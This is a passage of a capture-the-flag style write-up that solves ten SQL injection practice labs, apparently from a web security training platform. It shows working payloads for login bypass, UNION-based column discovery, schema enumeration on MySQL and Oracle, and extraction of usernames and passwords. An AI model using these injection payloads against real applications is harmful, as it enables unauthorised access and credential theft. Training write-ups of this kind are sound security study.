# SQL Injection

## Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

### Sol:
`+OR+1=1`

![image](https://user-images.githubusercontent.com/33444140/234489856-c3dd5689-888c-4571-b135-030024b0af06.png)

## Lab 2: SQL injection vulnerability allowing login bypass

### Sol:

`administrator'--`

![image](https://user-images.githubusercontent.com/33444140/234491811-0cffcfb0-ba68-4bfa-8d8a-14bc8ab32d66.png)

![image](https://user-images.githubusercontent.com/33444140/234492060-e5cd29d0-f65c-4d79-b894-efa1394cda95.png)

## Lab 3: SQL injection UNION attack, determining the number of columns returned by the query

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

### Sol :

`category='Pets'+union+select+null,null,.....<No of null occurences> --`

### Using one and two null values will gives us Internal Server Error due to non-matching of null values with no of cols

    category=Pets+union+select+null--
    
![image](https://user-images.githubusercontent.com/33444140/235349085-16ab2024-dbfa-4a0d-bf25-6767545b482a.png)

### Using third null will match the no of cols

    category=Pets+union+select+null,null,null--
    
![image](https://user-images.githubusercontent.com/33444140/235349154-0bcd2a7f-9f72-467f-be22-baae68c20f85.png)

### Alternate Sol :

> An alternate solution to count the no of cols by using `ORDER BY`. Injecting `ORDER BY 1--` will order the results by the first column of the result. Incrementing the value leads to an internal server error when using `ORDER BY 4--` as the database is instructed to order by a column that does not exist. Thus the correct number of columns is 3.    
 
## Lab 4: SQL injection UNION attack, finding a column containing text.

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

Make the database retrieve the string: 'e0J9uf'

### Sol :

  First we have to determine the no of cols of the category by using NULL values as shown above.
  
    category=Pets+union+select+null,null,null--
    
Then we have to check which col contains string by replacing null with 'a' each col

    category=Pets+union+select+'a',null,null--
    category=Pets+union+select+null,'a',null--
    category=Pets+union+select+null,null,'a'--
    
In this lab category we got 2nd col as string. So we replace `'a'` with the desired string.

    category=Pets+union+select+null,'e0J9uf',null--
    
Lab is solved.

![image](https://user-images.githubusercontent.com/33444140/235350029-db8d0569-07c6-4caf-baa9-913039a30d35.png)

## Lab 5: SQL injection UNION attack, retrieving data from other tables

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

### Sol :

First we determine two no of cols by running nul values and 'a' for confirming that it contains two string values.

        category=Lifestyle+union+select+'a','a'--
        
Then we give the username and password from users table to retreive the user credentials.

        category=Lifestyle+union+select+username,password+from+users--
        
After running it, we can see the users information.

![image](https://user-images.githubusercontent.com/33444140/235350807-d231e047-3c31-43f9-a6ee-d0bf8c80c2d7.png)

Logging in as administrator with its password.

![image](https://user-images.githubusercontent.com/33444140/235350892-d6d3c3af-282b-49d0-a403-211b8a6c7aa6.png)

## Lab 6: SQL injection UNION attack, retrieving multiple values in a single column

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

![image](https://user-images.githubusercontent.com/33444140/235353628-0dcb4114-4d79-4380-8474-fb1bbc47d882.png)

### Sol :

First we have to check the no of cols :
    
        category=Pets+union+select+null,null--
        
Then we check for which is string related col :

        category=Pets+union+select+null,null,'a'--
        
Then we give username and password as concatenated string

        category=Pets+union+select+null,username||'~'||password+from+users--
        
We will get the user credentials with ~ seperator

![image](https://user-images.githubusercontent.com/33444140/235354047-ea538ef2-4e48-425a-9388-4321d44d4137.png)

Then we give the administrator password to solve this lab.

![image](https://user-images.githubusercontent.com/33444140/235354088-49c50988-df94-47e0-bd8b-e52dd05ac795.png)

## Lab 7 : SQL injection attack, querying the database type and version on Oracle

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

Make the database retrieve the strings: 'Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production, PL/SQL Release 11.2.0.2.0 - Production, CORE 11.2.0.2.0 Production, TNS for Linux: Version 11.2.0.2.0 - Production, NLSRTL Version 11.2.0.2.0 - Production'

![image](https://user-images.githubusercontent.com/33444140/235354756-30e94167-685b-4de7-a325-040f9d1ac23a.png)

### Sol :

First we check the no of cols by injecting null values with dual for oracle database

        category=Gifts'+union+select+null,null+from+dual--

Then we give `SELECT * FROM v$version` to retreive the Oracle database info

        category=Gifts'+union+select+null,banner+from+v$version--
        
We will get the database info and lab got solved

![image](https://user-images.githubusercontent.com/33444140/235355211-844b8eaf-5ba2-4887-b105-f5012f86a243.png)

## Lab 8: SQL injection attack, querying the database type and version on MySQL and Microsoft.

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

Make the database retrieve the string: '8.0.32-0ubuntu0.20.04.2'

### Sol :

First we have to check the no of cols and string match :
    
        category=Gifts+union+select+null,'a'--
        
Then we give `select @@version` for MySQL and Microsoft version and `%23` for `#` to comment out.

        category=Gifts'+union+select+null,@@version%23
        
![image](https://user-images.githubusercontent.com/33444140/235367798-c5c89b60-5e10-4f1d-abc5-428882ae8e06.png)

## Lab 9: SQL injection attack, listing the database contents on non-Oracle databases

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

### Sol :

First we list the tables by using `information_schema.tables` query

        category=Pets'+union+select+table_name,+null+from+information_schema.tables--
        
![image](https://user-images.githubusercontent.com/33444140/235371041-3593a411-d557-4d5d-96d9-3e26dbdca292.png)

![image](https://user-images.githubusercontent.com/33444140/235371071-f7e2fb65-4ccf-4e26-b648-50724b6417c0.png)

Now we select col names from the table `users_xmoqhn`

        category=Pets'+union+select+column_name,+null+from+information_schema.columns+where+table_name='users_xmoqhn'--

![image](https://user-images.githubusercontent.com/33444140/235371245-20b6e4e0-29cf-4a62-af19-2f36ce1011d1.png)
![image](https://user-images.githubusercontent.com/33444140/235371259-90e83d8b-5b64-4230-a6b4-eaffb0d20dd2.png)

Now we enumerate all user credentials by above info

        category=Pets'+union+select+username_actmim,+password_kuerfj+from+users_xmoqhn--
        
We got the administrator password and logged in to solve the lab.

![image](https://user-images.githubusercontent.com/33444140/235371441-0cb7b2e7-c9a8-4af8-9bff-c71e7a9638d4.png)

![image](https://user-images.githubusercontent.com/33444140/235371476-b2279d4d-38fe-4acd-9ba8-38bd08392722.png)

## Lab 10: SQL injection attack, listing the database contents on Oracle

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user

### Sol :

First we list the tables present

        category=Pets'+union+select+table_name,null+from+all_tables--
        
![image](https://user-images.githubusercontent.com/33444140/235371884-fe186a04-9aaa-449d-a377-7c53a4a7f3a2.png)

Then we check for users table

        category=Pets%27+union+select+column_name,null+from+all_tab_columns+where+table_name=%27USERS_RKONPB%27--

![image](https://user-images.githubusercontent.com/33444140/235372070-0a88e270-3820-4c4e-a42f-ab88800513de.png)
![image](https://user-images.githubusercontent.com/33444140/235372077-b7822dc8-1201-4780-b2db-9e3ea0c33371.png)

We got the user credentials

![image](https://user-images.githubusercontent.com/33444140/235372208-6d06c55e-3a1b-4a59-8b5d-26818f89c7e0.png)

We logged in as administrator and solved the lab.

![image](https://user-images.githubusercontent.com/33444140/235372244-c8b2cfa7-55c7-40ce-af82-cd74c7ef7509.png)

## Lab 11: 
